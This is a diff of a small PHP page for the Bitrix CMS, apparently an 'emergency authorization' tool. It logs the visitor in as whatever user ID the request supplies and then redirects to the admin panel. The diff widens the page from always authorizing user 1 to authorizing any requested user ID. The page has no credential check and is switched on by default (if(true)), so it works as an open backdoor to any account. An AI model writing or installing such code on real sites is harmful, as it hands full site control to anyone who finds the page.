@@ -1,4 +1,7 @@
-<? require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php"); ?>
+<? 
+require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
+require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php"); 
+?>
 <?
 // Set `true` to enable
 if(true){
@@ -6,7 +9,7 @@ if(true){
 	$uid = (int)$_REQUEST['uid'];
 	if($uid){
 		global $USER;
-		$USER->Authorize(1);
+		$USER->Authorize($uid);
 		LocalRedirect("/bitrix/admin/");
 	}else{
 		echo 'uid not set!';
@@ -15,4 +18,6 @@ if(true){
 	echo 'Emergency authorization disabled!';
 }
 ?>
-<? require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php"); ?>
+<? 
+require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php"); 
+?>
